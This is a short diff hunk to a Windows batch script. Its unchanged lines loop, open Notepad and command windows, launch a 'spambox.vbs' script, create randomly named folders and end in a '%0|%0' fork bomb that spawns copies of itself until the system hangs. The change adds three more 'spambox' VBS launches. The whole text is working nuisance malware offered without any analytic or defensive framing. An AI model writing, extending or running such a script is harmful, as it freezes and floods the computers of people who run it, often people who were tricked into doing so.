@@ -7,6 +7,9 @@ goto b
  START %SystemRoot%\system32\notepad.exe
  start cmd
  start spambox.vbs
+ start spambox2.vbs
+ start spambox3.vbs
+ start spambox4.vbs
 md %random%
 /folder.
 %0|%0
